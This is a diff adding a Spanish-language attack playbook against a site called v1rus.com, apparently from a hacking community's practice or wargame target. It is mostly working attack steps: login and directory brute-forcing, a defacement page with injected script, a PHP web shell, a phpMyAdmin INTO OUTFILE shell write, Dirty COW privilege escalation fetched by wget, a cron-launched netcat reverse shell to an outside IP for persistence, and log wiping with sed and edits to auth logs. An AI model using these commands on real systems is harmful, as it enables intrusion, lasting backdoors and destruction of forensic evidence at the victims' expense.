@@ -1,0 +1,144 @@
+____________________________________________________________
+
+USER DISCLOSURE
+
+v1rus.com/login.php
+
+probar cualquier usuario
+
+probar v1ruS
+____________________________________________________________
+
+DIRECTORY BRUTEFORCE
+
+bash ddlr.sh
+7
+v1rus.com
+10
+____________________________________________________________
+
+Login BRUTEFORCE
+
+bash b.sh
+Enter URL: v1rus.com/login.php
+Enter username: v1ruS
+Enter Failure String: Panel de Login
+Form is POST or GET? (POST/GET): POST
+Username var: usuario
+Password var: password
+
+
+
+____________________________________________________________
+
+DEFACEMENT
+
+
+<br>
+<center>______________________________<br>
+<h1>Turbinas night!</h1>
+<br>
+<img src=https://img.ddlr.org/465047485964577480-turbinas.png><br>
+Esta noche nos juntamos en Discord para atacar a los lammers de DDLR, va a ser una noche &eacute;pica!<br>______________________________<br>
+<h1>Me quieren hackear pero no podr&aacute;n</h1>
+<br>
+<h2>Este servidor es a prueba de fuego y agua, no podr&aacute;n hackearlo</h2>
+
+
+<script>
+function w() {
+    document.write("<html><body bgcolor=black><center><font color=white><h1>PWNED BY DDLR</h1><br><img src=https://diosdelared.com/images/DDLR-White.png><br><h2>NOTHING IS SECURE</h2><br>Keep studing and stop barking ;)<br><br><br><h3><a href=https://www.diosdelared.com>Visit DDLR</a>");
+}
+
+window.onload = function() {
+    w();
+};
+</script>
+____________________________________________________________
+
+SHELL ON ADMIN
+
+
+<?php $r = system($_GET["c"]); echo $r; echo "<form> <input type=hidden name=page value='contenido.txt'><input type=text name=c><input type=submit></form>"; ?>
+____________________________________________________________
+
+PHPMYADMIN SHELL INTO OUTFILE
+
+Insertar en alguna tabla:
+<?php $r = system($_GET["c"]); echo $r; echo "<form> <input type=hidden name=page value='/tmp/s.php'><input type=text name=c><input type=submit></form>"; ?>
+
+En SQL:
+
+SELECT * INTO OUTFILE '/tmp/s.sh' FROM `testing` WHERE 1
+
+Continuar.
+
+
+____________________________________________________________
+
+MEJORAR SHELL
+
+encapsulamos la sesión en un script y ejecutamos bash
+script /dev/null -c bash
+
+suspendemos la terminal
+control +z
+
+ponemos modo "raw" para que muestre la data "tal cual es, sin formato", desactivamos el echo y traemos al frente de nuevo
+stty raw -echo; fg
+
+de vuelta en la shell remota escribimos:
+reset
+
+y nos pregunta "wich is the default terminal"? a lo que escribimos
+xterm
+
+
+_________________________________________________
+
+ROOT
+
+
+wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
+
+cat dirty.c
+
+gcc -pthread dirty.c -o a -lcrypt
+
+chmod 777 a
+
+./a 1234
+
+ssh $ip -l firefart
+_________________________________________________
+persistencia
+
+vim /bin/sh0
+while true; do
+
+	if ! ss -p | grep 1337; then
+		nc 192.168.100.2 1337 -e /bin/bash
+	fi
+	sleep 5
+done
+
+crontab
+
+@reboot /bin/sh0
+
+control+x
+
+_______________________________________________
+
+LOGS
+
+find / -type f -exec sed -i 's/TUIP/FAKEIP/g' {} +
+
+vim /root/bash_history
+
+vim /var/log/auth.log
+
+vim /var/log/failog
+
+etc...
+
